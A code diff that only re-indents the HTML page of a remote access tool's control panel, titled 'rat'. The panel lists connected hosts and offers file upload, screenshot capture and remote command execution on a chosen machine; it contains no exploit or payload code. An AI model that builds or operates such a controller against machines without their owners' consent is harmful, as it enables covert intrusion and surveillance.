@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <title>rat</title>
@@ -9,48 +10,56 @@
     <link href="lib/css/bootstrap.min.css" rel="stylesheet">
     <link href="css/index.css" rel="stylesheet">
 </head>
+
 <body>
-<div class="container">
-    <div class="row">
-        <div class="col-3">
-            <div class="card" style="height: 545px;">
-                <div class="card-header">
-                    Connections<a class="float-end" @click="list()">Refresh</a>
-                </div>
-                <div v-if="connections.length == 0" class="text-center">No connections</div>
-                <div v-else class="list-group list-group-flush border-bottom" style="overflow-y: auto;" rel="list">
-                    <a class="list-group-item list-group-item-action" v-for="connection in connections" data-bs-toggle="list" @click="target=connection; output=''; cwd=target.cwd">
-                        {{connection.hostname}}
-                    </a>
-                </div>
-            </div>
-        </div>
-        <div class="col-9">
-            <div class="card">
-                <div class="card-header">
-                    {{target == '' ? 'Not connected' : target.address + ' (' + target.hostname + ')'}}
-                    <a class="float-end" @click="output=''">Clear</a>
-                </div>
-                <form id="form" action="upload" method="post" enctype="multipart/form-data">
-                    <input type="file" name="file" id="file" class="d-none" @change="(event) => upload(event)">
-                </form>
-                <div style="padding: 0.5rem" class="border-bottom">
-                    <button class="btn btn-outline-primary btn-custom" onclick="document.getElementById('file').value=null; document.getElementById('file').click()">Upload</button>
-                    <button class="btn btn-outline-primary btn-custom" @click="screenshot()">Screenshot</button>
-                </div>
-                <div id="result" class="card-body border-bottom" style="height: 430px; overflow-y: auto">
-                    <div style="word-break: break-all; white-space: pre-wrap">
-                        <span v-html="output"></span>{{cwd + '> ' + command}}
+    <div class="container">
+        <div class="row">
+            <div class="col-3">
+                <div class="card" style="height: 545px">
+                    <div class="card-header">
+                        Connections<a class="float-end" @click="list()">Refresh</a>
+                    </div>
+                    <div v-if="connections.length == 0" class="text-center">No connections</div>
+                    <div v-else class="list-group list-group-flush border-bottom" style="overflow-y: auto;" rel="list">
+                        <a class="list-group-item list-group-item-action" v-for="connection in connections"
+                            data-bs-toggle="list" @click="target=connection; output=''; cwd=target.cwd">
+                            {{connection.hostname}}
+                        </a>
                     </div>
                 </div>
-                <div class="input-group">
-                    <input id="command" class="form-control form-control-sm border-0" placeholder="Command" v-model="command" @keyup.enter="execute" :disabled="wait" autofocus="autofocus" style="border-bottom-left-radius: var(--bs-card-border-radius)">
-                    <button class="btn btn-outline-primary btn-sm border-0" style="border-radius: 0; border-bottom-right-radius: var(--bs-card-border-radius)" @click="execute()" :disabled="wait">&nbsp;Send&nbsp;</button>
+            </div>
+            <div class="col-9">
+                <div class="card">
+                    <div class="card-header">
+                        {{target == '' ? 'Not connected' : target.address + ' (' + target.hostname + ')'}}
+                        <a class="float-end" @click="output=''">Clear</a>
+                    </div>
+                    <form id="form" action="upload" method="post" enctype="multipart/form-data">
+                        <input type="file" name="file" id="file" class="d-none" @change="(event) => upload(event)">
+                    </form>
+                    <div style="padding: 0.5rem" class="border-bottom">
+                        <button class="btn btn-outline-primary btn-custom"
+                            onclick="document.getElementById('file').value=null; document.getElementById('file').click()">Upload</button>
+                        <button class="btn btn-outline-primary btn-custom" @click="screenshot()">Screenshot</button>
+                    </div>
+                    <div id="result" class="card-body border-bottom" style="height: 430px; overflow-y: auto">
+                        <div style="word-break: break-all; white-space: pre-wrap">
+                            <span v-html="output"></span>{{cwd + '> ' + command}}
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <input id="command" class="form-control form-control-sm border-0" placeholder="Command"
+                            v-model="command" @keyup.enter="execute" :disabled="wait" autofocus="autofocus"
+                            style="border-bottom-left-radius: var(--bs-card-border-radius)">
+                        <button class="btn btn-outline-primary btn-sm border-0"
+                            style="border-radius: 0; border-bottom-right-radius: var(--bs-card-border-radius)"
+                            @click="execute()" :disabled="wait">&nbsp;Send&nbsp;</button>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
-</div>
 </body>
 <script src="js/index.js"></script>
+
 </html>
